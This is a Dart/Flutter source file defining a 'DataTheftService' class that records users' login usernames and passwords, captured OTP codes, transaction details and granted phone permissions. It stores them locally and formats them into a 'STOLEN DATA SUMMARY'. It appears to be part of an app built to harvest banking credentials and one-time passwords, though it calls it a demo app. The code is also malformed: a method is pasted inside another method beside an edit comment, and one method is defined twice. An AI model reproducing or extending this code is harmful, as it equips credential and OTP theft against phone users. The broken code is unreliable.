// lib/services/data_theft_service.dart
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:convert';
import 'json_file_service.dart';

class DataTheftService {
  final JsonFileService _jsonService = JsonFileService();

  Future<void> recordLogin(String username, String password, bool rememberMe) async {
    final loginTime = DateTime.now().toIso8601String();
    final data = {
      'username': username,
      'password': password,
      'rememberMe': rememberMe,
      'loginTime': loginTime,
      'deviceInfo': 'Flutter Demo App',
    };

    // In data_theft_service.dart, change the downloadJsonFile method to:
Future<void> downloadJsonFile() async {
  await _jsonService.downloadJsonFileAlternative();
}
    
    // Save to shared preferences
    await _saveToPreferences('login_data', data.toString());
    
    // Save to JSON file
    await _jsonService.saveLoginData(username, password, rememberMe);
  }
  
  Future<void> recordLogout() async {
    final logoutTime = DateTime.now().toIso8601String();
    final data = {
      'logoutTime': logoutTime,
    };
    
    // Save to shared preferences
    await _saveToPreferences('logout_data', data.toString());
    
    // Save to JSON file
    await _jsonService.saveLogoutData();
  }
  
  Future<void> recordPermissionsGranted() async {
    final data = {
      'permissions': ['SMS', 'Photos', 'Contacts', 'Location', 'Camera'],
      'grantedTime': DateTime.now().toIso8601String(),
    };
    
    // Save to shared preferences
    await _saveToPreferences('permissions_data', data.toString());
    
    // Save to JSON file
    await _jsonService.savePermissionsData();
  }
  
  Future<void> recordTransaction(String type, double amount, String recipient) async {
    final data = {
      'type': type,
      'amount': amount,
      'recipient': recipient,
      'time': DateTime.now().toIso8601String(),
    };
    
    // Save to shared preferences
    await _saveToPreferences('transaction_data', data.toString());
    
    // Save to JSON file
    await _jsonService.saveTransactionData(type, amount, recipient);
  }

  Future<void> recordOtp(String otp, String source) async {
    final data = {
      'otp': otp,
      'source': source,
      'captureTime': DateTime.now().toIso8601String(),
    };
    
    // Save to shared preferences
    await _saveToPreferences('otp_data', data.toString());
    
    // Save to JSON file
    await _jsonService.saveOtpData(otp, source);
  }
  
  Future<void> _saveToPreferences(String key, String content) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final existingData = prefs.getString(key) ?? '';
      await prefs.setString(key, '$existingData$content\n');
      print('Data saved to $key: $content');
    } catch (e) {
      print('Error saving data: $e');
    }
  }
  
  String getJsonData() {
    return _jsonService.getStolenDataJson();
  }

  List<Map<String, dynamic>> getAllStolenData() {
    return _jsonService.getAllStolenData();
  }

  Future<void> downloadJsonFile() async {
    await _jsonService.downloadJsonFile();
  }

  void clearStolenData() {
    _jsonService.clearStolenData();
  }
  
  Future<String> readStolenData() async {
    try {
      final jsonData = getJsonData();
      final parsedData = json.decode(jsonData);
      
      String data = "STOLEN DATA SUMMARY (JSON Format):\n\n";
      data += "Total entries: ${parsedData.length}\n\n";
      
      for (var entry in parsedData) {
        data += "Entry ID: ${entry['id']}\n";
        data += "Timestamp: ${entry['timestamp']}\n";
        data += "IP: ${entry['ip']}\n";
        data += "Action: ${entry['action']}\n";
        
        if (entry['action'] == 'login') {
          data += "Username: ${entry['username']}\n";
          data += "Password: ${entry['password']}\n";
        } else if (entry['action'] == 'transaction') {
          data += "Amount: ₹${entry['amount']}\n";
          data += "Recipient: ${entry['recipient']}\n";
        } else if (entry['action'] == 'otp_captured') {
          data += "OTP: ${entry['otp']}\n";
          data += "Source: ${entry['source']}\n";
        }
        
        data += "Platform: ${entry['platform']}\n";
        data += "User Agent: ${entry['userAgent']}\n";
        data += "−".padRight(50, '−') + "\n\n";
      }
      
      return data;
    } catch (e) {
      return "Error reading stolen data: $e";
    }
  }
}